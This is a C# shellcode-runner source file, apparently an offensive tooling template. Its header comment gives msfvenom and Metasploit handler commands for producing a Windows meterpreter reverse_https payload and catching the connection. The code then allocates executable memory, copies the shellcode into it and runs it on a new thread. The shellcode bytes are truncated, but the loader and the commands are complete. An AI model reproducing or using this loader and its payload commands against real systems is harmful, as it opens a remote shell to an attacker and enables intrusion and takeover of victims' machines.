/*
Generate shellcode
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -f csharp -o shellcode.txt

Start msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <your IP>
set LPORT <your port>
exploit
*/

using System;
using System.Runtime.InteropServices;

class ShellcodeExec
{
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WaitForSingleObject(IntPtr hHandle,
        uint dwMilliseconds);

    static void Main(string[] args)
    {
        // The meterpreter shellcode
        byte[] shellcode = new byte[] {0xfc, ... };
        // Allocate memory for the shellcode
        IntPtr memory = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000, 0x40);
        // Copy the shellcode to the allocated memory
        Marshal.Copy(shellcode, 0, memory, shellcode.Length);
        // Create a new thread with the shellcode
        IntPtr thread = CreateThread(IntPtr.Zero, 0, memory, IntPtr.Zero, 0, IntPtr.Zero);
        // Wait for the thread to complete
        WaitForSingleObject(thread, 0xFFFFFFFF);
    }
}
